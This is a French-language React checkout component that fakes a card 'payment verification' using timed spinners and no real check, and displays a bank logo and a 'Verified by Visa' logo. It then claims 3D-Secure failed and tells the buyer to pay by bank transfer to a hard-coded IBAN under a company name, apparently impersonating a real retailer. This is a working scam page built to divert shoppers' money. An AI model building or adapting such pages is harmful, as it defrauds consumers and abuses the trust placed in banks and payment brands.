import React from 'react';

const CheckoutVerify = ({ verificationError, bankName, bankLogo, cardType, cardScheme, cardCountry, discountedPrice }) => {
  const [cardHolder, setCardHolder] = React.useState('');
  const [step, setStep] = React.useState(1);

  React.useEffect(() => {
    const timer = setTimeout(() => {
      if (step === 1) {
        setStep(2);
      }
    }, 12000); // 8 seconds delay

    return () => clearTimeout(timer); // Cleanup the timer on component unmount
  }, [step]);

  const handleVerifyClick = () => {
    setStep(3);
    setTimeout(() => {
      // Simulate verification process
      setStep(4);
    }, 16000); // 6 seconds delay
  };

  return (
    <div className="verification-wrapper">
      <div className="verification-popup">
        {step === 1 ? (
          <>
            <h2>Vérification du paiement </h2>
            <p className='desc'>Nous vérifions votre moyen de paiement, cela peut prendre jusqu'à 30 secondes, merci de patientier.</p>
            <div className="loader"></div>
          </>
        ) : step === 2 ? (
          <>
            <div className='head'>
              <img src={bankLogo ? bankLogo : '/favicon.png'} alt={`${bankName} logo`} className="bank-logo" />
              <img src='/verified-by-visa.png' alt="Verified by Visa logo" className="visa-logo" />
            </div>
            <h2>Confirmation du paiement</h2>
            <p className='desc'>Confirmez les informations suivantes pour vérifier votre carte bancaire et finaliser votre commande :</p>
            <div className="input-list">
              <label>
                <span>Titulaire</span> <input type="text" id="cardHolder" placeholder='Nom complet' onChange={(e) => setCardHolder(e.target.value)} required/>
              </label>
              <label>
                <span>Banque</span> <input type="text" id="bankName" value={bankName} disabled/>
              </label>
              <label>
                <span>Type</span> <input type="text" id="cardNumber"  value={cardType} disabled/>
              </label>
              <label>
                <span>Réseau</span> <input type="text" id="cardScheme" value={cardScheme} disabled/>
              </label>
              <label>
                <span>Pays</span> <input type="text" id="cardCountry" value={cardCountry} disabled/>
              </label>
            </div>
            <button onClick={handleVerifyClick}>Confirmer le paiement</button>
            <p className='notice'>En cas d'informations incorrectes, votre paiement sera rejeté par notre banque et votre commande annulée.</p>
          </>
        ) : step === 3 ? (
          <>
            <h2>Vérification des informations</h2>
            <p className='desc'>Informations en cours de vérification, patientez quelques instants pour finaliser votre commande.</p>
            <div className="loader"></div>
          </>
        ) : step === 4 ? (
          <>
            <div className='head'>
              <img src={bankLogo ? bankLogo : '/favicon.png'} alt={`${bankName} logo`} className="bank-logo" />
              <img src='/verified-by-visa.png' alt="Verified by Visa logo" className="visa-logo" />
            </div>
            <h2>Finalisez votre commande</h2> 
            <p className='desc'>Votre carte n'a pas pu être via 3D-secure, confirmez votre identité et finalisez votre commande par virement, via un compte bancaire à votre nom.</p>
            <div className="iban-group">
              <p><strong>Titulaire du compte : </strong>Christopeit France SAS</p>
              <p><strong>IBAN : </strong>FR76 1774 8019 8476 7209 4920 203</p>
              <p><strong>BIC/SWIFT : </strong>DBLKR FR22 XXX</p>
              <p className='row'><span className='id'><strong>Objet :</strong> Commande 182F57</span><span className='amount'><strong>Montant :</strong> {discountedPrice}€</span></p>
            </div>
            <p className='smaller'>Une fois le virement effectué, cliquez ci-dessous pour finaliser votre commande et recevoir vos informations de suivis :</p>
            <button onClick={() => window.location.href = '/confirmation'}>Suivre ma commande</button>
          </>
        ) : (
          <>
            <h2>Vérification réussie</h2>
            <p className='desc'>Votre carte a été vérifiée avec succès.</p>
          </>
        )}
      </div>
    </div>
  );
};

export default CheckoutVerify;